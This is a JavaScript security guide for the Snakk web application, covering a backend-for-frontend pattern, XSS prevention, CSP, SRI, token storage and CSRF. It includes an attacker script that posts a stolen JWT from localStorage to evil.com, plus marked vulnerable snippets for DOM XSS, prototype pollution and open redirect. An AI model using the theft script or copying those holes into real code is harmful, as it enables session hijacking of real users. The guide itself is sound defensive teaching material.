# JavaScript Security Guide

This document outlines security measures, patterns, and best practices for JavaScript in the Snakk application.

## 🔒 Table of Contents

1. [🚨 CRITICAL: BFF Pattern](#-critical-bff-pattern)
2. [Current Security Status](#current-security-status)
3. [XSS Prevention](#xss-prevention)
4. [Content Security Policy (CSP)](#content-security-policy-csp)
5. [Subresource Integrity (SRI)](#subresource-integrity-sri)
6. [Token Security](#token-security)
7. [API Security](#api-security)
8. [Input Validation](#input-validation)
9. [Third-party Dependencies](#third-party-dependencies)
10. [Secure Coding Patterns](#secure-coding-patterns)
11. [Security Checklist](#security-checklist)

---

## 🚨 CRITICAL: BFF Pattern

### Backend-for-Frontend (BFF) Architecture

**MANDATORY**: JavaScript must NEVER call the internal API directly.

#### The Architecture:

```
[Browser JavaScript]
       ↓
   /bff/* endpoints
       ↓
[ASP.NET Snakk.Web] ← BFF Layer (validates, authenticates, forwards)
       ↓
Internal API (firewalled)
```

#### The Rules:

❌ **FORBIDDEN**:
```javascript
// Direct API calls
fetch(`${apiBaseUrl}/api/users/123/stats`)
fetch('https://localhost:7291/api/...')
```

✅ **REQUIRED**:
```javascript
// BFF calls only
fetch('/bff/users/123/stats')
fetch('/bff/discussions/456/posts')
```

#### Why This Matters for Security:

1. **Firewall Protection**: Internal API is not exposed to internet
2. **Request Validation**: BFF validates/sanitizes before forwarding
3. **Authentication Control**: BFF handles JWT verification centrally
4. **Rate Limiting**: Can implement per-user rate limits at BFF layer
5. **Attack Surface Reduction**: Only BFF endpoints exposed to browser
6. **Input Sanitization**: Single point to validate all user input
7. **Authorization Enforcement**: BFF checks permissions before forwarding

#### Enforcement:

See [CLAUDE.md](../../../CLAUDE.md) for complete BFF pattern enforcement rules.

**Before any code review**: Check for `apiBaseUrl`, `/api/`, or direct API URLs.

---

## ✅ Current Security Status

### What We're Doing Well

1. **✅ XSS Prevention**
   - Using `escapeHtml()` utility for user-generated content
   - Using `textContent` instead of `innerHTML` where possible
   - Using `<template>` elements for complex HTML

2. **✅ JWT Token Management**
   - Tokens stored in localStorage (see recommendations below)
   - Token expiration checking
   - Automatic token injection for API calls

3. **✅ Fetch Interceptor**
   - Automatic authorization headers for API calls
   - Scoped to API endpoints only

### ⚠️ Areas for Improvement

See recommendations throughout this document.

---

## 🛡️ XSS Prevention

### Rule #1: Never Trust User Input

**ALWAYS escape user-generated content before rendering:**

```javascript
// ❌ DANGEROUS - XSS vulnerability
element.innerHTML = userInput;

// ✅ SAFE - Escaped
element.innerHTML = escapeHtml(userInput);

// ✅ SAFER - Use textContent for plain text
element.textContent = userInput; // Automatically escaped
```

### Current Implementation

**Location:** `core/utils.js`

```javascript
function escapeHtml(text) {
    if (!text) return '';
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
```

**Usage pattern in codebase:**

```javascript
// ✅ GOOD - Escaped in template literal
const html = `<a href="${baseUrl}">${escapeHtml(discussion.title)}</a>`;

// ✅ GOOD - Using textContent
element.textContent = userProvidedText;

// ✅ GOOD - Template element with escaped content
const template = document.createElement('template');
template.innerHTML = `<div>${escapeHtml(content)}</div>`;
```

### XSS Protection Checklist

- ✅ Escape all user input in HTML context
- ✅ Escape URL parameters
- ✅ Escape JSON data rendered in HTML
- ✅ Use textContent for plain text
- ✅ Sanitize markdown/rich text (if applicable)
- ⚠️ Avoid `eval()` and `Function()` constructor
- ⚠️ Avoid `javascript:` URLs
- ⚠️ Validate and sanitize URLs before href/src attributes

---

## 🔐 Content Security Policy (CSP)

### What is CSP?

Content Security Policy is an HTTP header that tells the browser which resources are allowed to load. It's your **best defense against XSS attacks**.

### ⚠️ CRITICAL RECOMMENDATION

**Add CSP headers to your application!**

**Location:** `Program.cs` or middleware

```csharp
app.Use(async (context, next) =>
{
    // Strict CSP policy
    context.Response.Headers.Add("Content-Security-Policy",
        "default-src 'self'; " +
        "script-src 'self' 'unsafe-inline' 'unsafe-eval'; " + // ⚠️ Consider removing unsafe-*
        "style-src 'self' 'unsafe-inline'; " +
        "img-src 'self' data: https:; " +
        "font-src 'self'; " +
        "connect-src 'self' https://localhost:7291 wss://localhost:7291; " +
        "frame-ancestors 'none'; " +
        "base-uri 'self'; " +
        "form-action 'self'");

    await next();
});
```

### CSP Best Practices

1. **Start with strict policy, relax as needed**
2. **Remove `'unsafe-inline'` and `'unsafe-eval'` if possible**
   - Use nonces for inline scripts
   - Move inline scripts to external files
3. **Use CSP reporting** to monitor violations
4. **Test thoroughly** - CSP can break legitimate functionality

### CSP Nonce Pattern (Recommended)

```csharp
// In middleware - generate nonce
var nonce = Convert.ToBase64String(RandomNumberGenerator.GetBytes(16));
context.Items["csp-nonce"] = nonce;

context.Response.Headers.Add("Content-Security-Policy",
    $"script-src 'self' 'nonce-{nonce}'; style-src 'self' 'nonce-{nonce}'");
```

```html
<!-- In Razor view -->
<script nonce="@Context.Items["csp-nonce"]">
    window.apiBaseUrl = '@Configuration["ApiBaseUrl"]';
</script>
```

---

## 🔒 Subresource Integrity (SRI)

### What is SRI?

SRI ensures that files loaded from CDNs haven't been tampered with. Uses cryptographic hashes.

### ⚠️ RECOMMENDATION

**Add SRI hashes for vendor libraries!**

**Current vendor files:**
- `vendor/htmx.min.js`
- `vendor/signalr.min.js`

### How to Generate SRI Hashes

```bash
# Using OpenSSL
openssl dgst -sha384 -binary vendor/htmx.min.js | openssl base64 -A

# Using online tool
https://www.srihash.org/
```

### Implementation

```html
<!-- ❌ Without SRI -->
<script src="~/js/vendor/htmx.min.js"></script>

<!-- ✅ With SRI -->
<script src="~/js/vendor/htmx.min.js"
        integrity="sha384-abc123..."
        crossorigin="anonymous"></script>
```

**Add to:** `Pages/Shared/_Layout.cshtml`

```html
<script src="~/js/vendor/htmx.min.js"
        integrity="sha384-[HASH]"
        crossorigin="anonymous"
        asp-append-version="true"></script>
```

---

## 🔑 Token Security

### Current Implementation Review

**Location:** `core/auth.js`

```javascript
// ⚠️ SECURITY CONCERN: localStorage is vulnerable to XSS
const TOKEN_KEY = 'snakk_jwt_token';
const REFRESH_TOKEN_KEY = 'snakk_refresh_token';

function setToken(token) {
    localStorage.setItem(TOKEN_KEY, token); // ⚠️ Vulnerable to XSS
}
```

### 🔴 CRITICAL: Token Storage Vulnerability

**Problem:** If an attacker can execute JavaScript (XSS), they can steal tokens from localStorage:

```javascript
// Attacker's malicious script
fetch('https://evil.com/steal', {
    method: 'POST',
    body: localStorage.getItem('snakk_jwt_token')
});
```

### ✅ Recommended Solutions

#### Option 1: HttpOnly Cookies (BEST)

**Most secure option - not accessible to JavaScript at all.**

```csharp
// In your API - set token as HttpOnly cookie
Response.Cookies.Append("snakk_jwt_token", token, new CookieOptions
{
    HttpOnly = true,     // ← NOT accessible to JavaScript
    Secure = true,       // ← Only sent over HTTPS
    SameSite = SameSiteMode.Strict, // ← CSRF protection
    MaxAge = TimeSpan.FromHours(1)
});
```

**Changes needed:**
- Remove token from localStorage
- Browser automatically sends cookie with requests
- Remove fetch interceptor (not needed)

#### Option 2: In-Memory Storage + Refresh Tokens

**Store access token in memory, refresh token in HttpOnly cookie.**

```javascript
// In-memory storage (lost on page refresh)
let accessToken = null;

const snakkAuth = {
    setToken(token) {
        accessToken = token; // Memory only
        // Refresh token stays in HttpOnly cookie (set by server)
    },

    getToken() {
        return accessToken;
    },

    // On page load, use refresh token to get new access token
    async refreshAccessToken() {
        const response = await fetch('/api/auth/refresh', {
            method: 'POST',
            credentials: 'include' // Sends refresh token cookie
        });
        const data = await response.json();
        this.setToken(data.accessToken);
    }
};

// On page load
snakkAuth.refreshAccessToken();
```

#### Option 3: Keep localStorage but Mitigate

**If you must use localStorage, add these protections:**

1. **Short token lifetime** (15 minutes max)
2. **Refresh token rotation**
3. **Strict CSP** to prevent XSS
4. **Token binding** (validate against browser fingerprint)

```javascript
// Add token binding
function setToken(token) {
    const fingerprint = getBrowserFingerprint();
    const boundToken = {
        token,
        fingerprint,
        expires: Date.now() + (15 * 60 * 1000) // 15 minutes
    };
    localStorage.setItem(TOKEN_KEY, JSON.stringify(boundToken));
}

function getToken() {
    const data = JSON.parse(localStorage.getItem(TOKEN_KEY));
    if (!data) return null;

    // Validate fingerprint
    if (data.fingerprint !== getBrowserFingerprint()) {
        clearToken();
        return null;
    }

    // Check expiration
    if (Date.now() > data.expires) {
        clearToken();
        return null;
    }

    return data.token;
}

function getBrowserFingerprint() {
    return btoa(navigator.userAgent + screen.width + screen.height);
}
```

### Token Security Checklist

- ⚠️ Consider HttpOnly cookies for tokens
- ✅ Use short token lifetimes (15-60 minutes)
- ✅ Implement token refresh mechanism
- ✅ Validate token expiration (already doing this)
- ⚠️ Add token binding/fingerprinting
- ⚠️ Implement CSRF protection for state-changing operations
- ✅ Use HTTPS only (Secure flag on cookies)
- ✅ Clear tokens on logout (already doing this)

---

## 🌐 API Security

### Current Fetch Interceptor (BFF Pattern)

**Location:** `core/auth.js`

```javascript
function setupFetchInterceptor() {
    const originalFetch = window.fetch;

    window.fetch = function(url, options = {}) {
        const urlString = typeof url === 'string' ? url : url.url;

        // JavaScript ONLY calls /bff/* endpoints (Backend-for-Frontend)
        // The BFF layer (ASP.NET) then calls the internal API
        const isBffCall = urlString.includes('/bff/');

        if (isBffCall) {
            const method = (options.method || 'GET').toUpperCase();
            const headers = {
                ...options.headers,
                ...getAuthHeaders() // JWT token for BFF authentication
            };

            // Add CSRF token for state-changing operations
            if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(method)) {
                const csrfToken = getCSRFToken();
                if (csrfToken) {
                    headers['RequestVerificationToken'] = csrfToken;
                    headers['X-CSRF-TOKEN'] = csrfToken;
                }
            }

            options.headers = headers;
        }

        return originalFetch(url, options);
    };
}
```

**Key Security Features:**
- Only intercepts `/bff/*` endpoints (not direct API calls)
- Automatically adds JWT bearer token
- Adds CSRF protection for state-changing operations
- No exposure of internal API URLs to browser

### ✅ Improvements

#### 1. Add Request Timeout

```javascript
function fetchWithTimeout(url, options = {}) {
    const timeout = options.timeout || 30000; // 30 seconds default

    return Promise.race([
        fetch(url, options),
        new Promise((_, reject) =>
            setTimeout(() => reject(new Error('Request timeout')), timeout)
        )
    ]);
}
```

#### 2. Add Request Rate Limiting

```javascript
class RateLimiter {
    constructor(maxRequests = 100, windowMs = 60000) {
        this.requests = [];
        this.maxRequests = maxRequests;
        this.windowMs = windowMs;
    }

    canMakeRequest() {
        const now = Date.now();
        this.requests = this.requests.filter(time => now - time < this.windowMs);

        if (this.requests.length >= this.maxRequests) {
            console.warn('[RateLimiter] Too many requests');
            return false;
        }

        this.requests.push(now);
        return true;
    }
}

const apiLimiter = new RateLimiter(100, 60000); // 100 requests per minute

window.fetch = function(url, options = {}) {
    if (isApiCall && !apiLimiter.canMakeRequest()) {
        return Promise.reject(new Error('Rate limit exceeded'));
    }

    // ... rest of interceptor
};
```

#### 3. Add CSRF Token Support

```javascript
function getCSRFToken() {
    // Get CSRF token from meta tag or cookie
    return document.querySelector('meta[name="csrf-token"]')?.content ||
           getCookie('XSRF-TOKEN');
}

window.fetch = function(url, options = {}) {
    if (isApiCall && ['POST', 'PUT', 'DELETE', 'PATCH'].includes(options.method?.toUpperCase())) {
        options.headers = {
            ...options.headers,
            'X-CSRF-TOKEN': getCSRFToken()
        };
    }

    // ... rest of interceptor
};
```

---

## ✅ Input Validation

### Client-Side Validation (UI/UX)

```javascript
// Validate email
function isValidEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}

// Validate username (alphanumeric + underscore/dash)
function isValidUsername(username) {
    const re = /^[a-zA-Z0-9_-]{3,20}$/;
    return re.test(username);
}

// Validate URL
function isValidUrl(url) {
    try {
        const parsed = new URL(url);
        return ['http:', 'https:'].includes(parsed.protocol);
    } catch {
        return false;
    }
}

// Sanitize filename
function sanitizeFilename(filename) {
    return filename.replace(/[^a-zA-Z0-9._-]/g, '_');
}
```

### ⚠️ IMPORTANT

**Client-side validation is for UX only. ALWAYS validate on the server!**

```javascript
// ❌ WRONG - Trusting client-side validation
if (isValidEmail(email)) {
    // Directly use email - DANGEROUS!
}

// ✅ CORRECT - Validate on server, client-side for UX
if (isValidEmail(email)) {
    // Send to server for validation
    await fetch('/api/validate-email', {
        method: 'POST',
        body: JSON.stringify({ email })
    });
}
```

---

## 📦 Third-party Dependencies

### Security for Vendor Libraries

**Current vendors:**
- `vendor/htmx.min.js`
- `vendor/signalr.min.js`

### ✅ Security Checklist for Dependencies

1. **Pin Versions**
   ```html
   <!-- ✅ GOOD - Specific version -->
   <script src="~/js/vendor/htmx.min.js" data-version="1.9.10"></script>

   <!-- ❌ BAD - Latest (can break or introduce vulnerabilities) -->
   <script src="https://unpkg.com/htmx.org@latest"></script>
   ```

2. **Use Subresource Integrity (SRI)** - See section above

3. **Audit Dependencies Regularly**
   ```bash
   # Check for known vulnerabilities
   npm audit

   # Update dependencies
   npm update
   ```

4. **Host Locally (✅ Already doing this!)**
   - Reduces reliance on CDNs
   - Better privacy for users
   - Works offline
   - Can add SRI

5. **Document Versions**
   Create `vendor/README.md`:
   ```markdown
   # Vendor Libraries

   | Library | Version | Source | Last Updated |
   |---------|---------|--------|--------------|
   | HTMX    | 1.9.10  | https://htmx.org | 2026-01-15 |
   | SignalR | 7.0.0   | https://...      | 2026-01-15 |
   ```

---

## 🔐 Secure Coding Patterns

### 1. Avoid eval() and Function()

```javascript
// ❌ DANGEROUS - Can execute arbitrary code
eval(userInput);
new Function(userInput)();
setTimeout(userInput, 1000);

// ✅ SAFE - Parse as JSON instead
const data = JSON.parse(userInput);

// ✅ SAFE - Use specific functions
const handlers = {
    'action1': () => doAction1(),
    'action2': () => doAction2()
};
handlers[userInput]?.();
```

### 2. Avoid javascript: URLs

```javascript
// ❌ DANGEROUS - XSS vector
element.innerHTML = `<a href="javascript:${userInput}">Click</a>`;

// ✅ SAFE - Use data attributes + event delegation
element.innerHTML = `<a href="#" data-action="${escapeHtml(action)}">Click</a>`;

document.addEventListener('click', (e) => {
    const action = e.target.dataset.action;
    if (action === 'delete') handleDelete();
});
```

### 3. Validate URLs

```javascript
// Validate before using in href or src
function sanitizeUrl(url) {
    try {
        const parsed = new URL(url, window.location.origin);

        // Only allow http/https
        if (!['http:', 'https:'].includes(parsed.protocol)) {
            console.warn('Invalid protocol:', parsed.protocol);
            return '#';
        }

        return parsed.href;
    } catch {
        console.warn('Invalid URL:', url);
        return '#';
    }
}

// Usage
element.href = sanitizeUrl(userProvidedUrl);
```

### 4. Use Trusted Types (Modern Browsers)

```javascript
// Create a policy for safe HTML
if (window.trustedTypes && window.trustedTypes.createPolicy) {
    const policy = trustedTypes.createPolicy('snakk-html', {
        createHTML: (string) => {
            // Sanitize HTML here (use DOMPurify or similar)
            return escapeHtml(string);
        }
    });

    // Use policy
    element.innerHTML = policy.createHTML(userInput);
}
```

### 5. Secure Event Handlers

```javascript
// ❌ BAD - onclick in HTML with user data
element.innerHTML = `<button onclick="handleClick('${userData}')">`;

// ✅ GOOD - Event delegation
element.innerHTML = `<button data-user-id="${escapeHtml(userId)}">`;
element.addEventListener('click', (e) => {
    const userId = e.target.dataset.userId;
    handleClick(userId);
});
```

---

## 📋 Security Checklist

### Before Deploying

- [ ] All user input is escaped/sanitized
- [ ] CSP headers are configured
- [ ] SRI hashes added for vendor libraries
- [ ] Tokens stored securely (preferably HttpOnly cookies)
- [ ] HTTPS enforced (no mixed content)
- [ ] CSRF protection implemented
- [ ] Input validation on both client and server
- [ ] Error messages don't leak sensitive info
- [ ] console.log() removed or disabled in production
- [ ] Source maps disabled in production
- [ ] Audit third-party dependencies
- [ ] Rate limiting for API calls
- [ ] Session timeout implemented
- [ ] XSS scanner run on application

### Code Review Checklist

For every new JavaScript file or change:

- [ ] No use of eval() or Function()
- [ ] No javascript: URLs
- [ ] All innerHTML uses escapeHtml()
- [ ] All user input validated
- [ ] No sensitive data in localStorage
- [ ] No secrets in client-side code
- [ ] Error handling doesn't expose internals
- [ ] Fetch calls have timeout
- [ ] Event listeners are cleaned up (destroy methods)

---

## 🚨 Common Vulnerabilities to Watch For

### 1. DOM-Based XSS

```javascript
// ❌ VULNERABLE
const search = window.location.search;
document.body.innerHTML = `You searched for: ${search}`;

// ✅ SAFE
const search = new URLSearchParams(window.location.search).get('q');
document.body.textContent = `You searched for: ${search}`;
```

### 2. Prototype Pollution

```javascript
// ❌ VULNERABLE - Can modify Object.prototype
function merge(target, source) {
    for (let key in source) {
        target[key] = source[key]; // Dangerous if key is "__proto__"
    }
}

// ✅ SAFE - Use Object.assign or spread operator
function merge(target, source) {
    return Object.assign({}, target, source);
}
```

### 3. Open Redirect

```javascript
// ❌ VULNERABLE
const redirect = new URLSearchParams(location.search).get('redirect');
window.location = redirect; // Can redirect to evil.com

// ✅ SAFE - Validate redirect URL
const redirect = new URLSearchParams(location.search).get('redirect');
if (redirect && redirect.startsWith('/')) {
    window.location = redirect; // Only allow relative URLs
}
```

---

## 📚 Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Content Security Policy Reference](https://content-security-policy.com/)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)

---

## 🔄 Next Steps

### High Priority

1. **Implement CSP headers** - Critical for XSS prevention
2. **Add SRI hashes** - For vendor libraries
3. **Review token storage** - Consider HttpOnly cookies
4. **Add CSRF protection** - For state-changing operations

### Medium Priority

5. **Add request timeout** - To fetch interceptor
6. **Add rate limiting** - Client-side rate limiting
7. **Audit dependencies** - Check for vulnerabilities
8. **Add Trusted Types** - If using modern browsers

### Low Priority

9. **Add token binding** - Extra layer of security
10. **Security headers** - X-Frame-Options, X-Content-Type-Options
11. **Error monitoring** - Track security-related errors
12. **Security scanner** - Automated security testing

---

**Last Updated:** February 2026
**Review Schedule:** Quarterly security review
